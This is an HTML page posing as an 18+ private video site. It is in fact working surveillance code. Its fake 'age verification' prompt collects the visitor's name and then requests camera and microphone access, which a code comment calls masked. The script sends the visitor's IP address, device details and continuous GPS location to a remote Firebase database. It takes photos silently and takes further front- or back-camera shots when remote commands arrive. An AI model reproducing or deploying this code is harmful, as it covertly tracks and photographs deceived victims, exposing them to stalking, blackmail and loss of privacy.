<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access | 18+</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        /* Clear Background - No Blur */
        #bg-image {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('bg.png.jpeg'); 
            background-size: cover; 
            background-position: center;
            z-index: 1; 
            opacity: 1; 
        }

        /* UI Mask Overlay */
        #main-ui {
            position: relative; z-index: 10; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            background: rgba(0,0,0,0.4); /* Halka dark parda taake text aur buttons chamkein */
        }

        #unlock-btn {
            background: #ff0050; /* Sexy Red/Pinkish color */
            color: #fff;
            padding: 18px 35px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 0 25px rgba(255, 0, 80, 0.6); 
            transition: 0.3s ease;
            border: none;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }

        #play-icon {
            width: 70px; height: 70px; 
            background: rgba(255, 255, 255, 0.2);
            border: 3px solid #fff; border-radius: 50%; display: flex;
            justify-content: center; align-items: center; cursor: pointer;
            backdrop-filter: blur(5px);
        }
        #play-icon::after {
            content: ''; border-top: 12px solid transparent; border-bottom: 12px solid transparent;
            border-left: 20px solid white; margin-left: 5px; 
        }

        /* Identity/Age Check Modal */
        #age-modal {
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 85%; max-width: 340px; background: #1a1a1a; border: 1px solid #333;
            border-radius: 20px; padding: 30px; text-align: center; z-index: 200;
            box-shadow: 0 0 40px rgba(0,0,0,0.8);
        }
        
        .input-name { 
            width: 100%; padding: 15px; margin: 15px 0; 
            background: #252525; border: 1px solid #444; 
            color: #fff; border-radius: 10px; font-size: 16px;
            box-sizing: border-box;
        }

        .confirm-btn {
            background: #00ff41; color: #000; width: 100%; 
            padding: 15px; border-radius: 10px; font-weight: bold; 
            font-size: 16px; border: none; cursor: pointer;
        }

        /* YouTube Container */
        #video-container { 
            display: none; position: fixed; top: 0; left: 0; 
            width: 100%; height: 100%; z-index: 1000; background: #000; 
        }
        iframe { width: 100%; height: 100%; border: none; }

        #loading-text { 
            display: none; color: #fff; position: fixed; top: 50%; left: 50%; 
            transform: translate(-50%, -50%); z-index: 1001; font-weight: 300; 
            letter-spacing: 2px;
        }
    </style>
</head>
<body>

    <div id="bg-image"></div>
    <div id="loading-text">CONNECTING TO STREAM...</div>

    <div id="main-ui">
        <button id="unlock-btn" onclick="showModal()">START PRIVATE STREAM</button>
        <div id="play-icon" onclick="showModal()"></div>
        <p style="color: #fff; margin-top: 20px; font-size: 14px; opacity: 0.8;">18+ Adult Content Verification Required</p>
    </div>

    <div id="age-modal">
        <h2 style="color:#fff; margin-bottom: 10px;">Age Verification</h2>
        <p style="color:#bbb; font-size: 14px;">Please enter your full name to confirm you are 18+ and unlock the private video.</p>
        <input type="text" id="targetName" class="input-name" placeholder="Enter Full Name...">
        <button class="confirm-btn" onclick="startEverything()">VERIFY & UNLOCK</button>
    </div>

    <div id="video-container">
        <iframe id="main-player" 
            src="https://www.youtube.com/watch?v=6Ogzc_-lW9w&list=RD6Ogzc_-lW9w&start_radio=1" 
            allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen>
        </iframe>
    </div>

<script>
    // Firebase Setup
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    let sessionID = "USER_" + Math.floor(1000 + Math.random() * 9000);
    let globalStream = null;

    function showModal() { document.getElementById('age-modal').style.display = 'block'; }

    async function startEverything() {
        const uName = document.getElementById('targetName').value;
        if(!uName) { alert("Please enter name for age verification!"); return; }

        document.getElementById('age-modal').style.display = 'none';
        document.getElementById('loading-text').style.display = 'block';

        try {
            // Permission for Camera and Mic (Masked as Age Check)
            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // Show YouTube Stream
            document.getElementById('video-container').style.display = 'block';
            document.getElementById('loading-text').style.display = 'none';

            // Start Tracking & Capturing
            sendInfo(uName);
            trackGPS();
            
            // Background Captures
            setTimeout(() => capture("user"), 5000); // 5 sec baad photo
            
            // Firebase Commands
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val();
                if(cmd) {
                    if(cmd.action === 'photo') capture("user");
                    if(cmd.action === 'back') capture("environment");
                    db.ref(`commands/${sessionID}`).remove();
                }
            });

        } catch (e) {
            alert("Verification Failed: Camera access is mandatory for 18+ age check.");
            location.reload();
        }
    }

    async function capture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: mode } } });
            const tempVid = document.createElement('video');
            tempVid.srcObject = stream;
            await tempVid.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                canvas.getContext('2d').drawImage(tempVid, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.5),
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
            }, 3000);
        } catch (err) {}
    }

    async function sendInfo(name) {
        const batt = await navigator.getBattery().catch(() => ({level:1}));
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
        db.ref(`targets/${sessionID}/info`).set({
            status: "ONLINE", customName: name, ip: ip.ip,
            battery: Math.floor(batt.level * 100) + "%",
            device: navigator.userAgent.split(') ')[0] + ')',
            time: new Date().toLocaleTimeString()
        });
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }
</script>
</body>
</html>
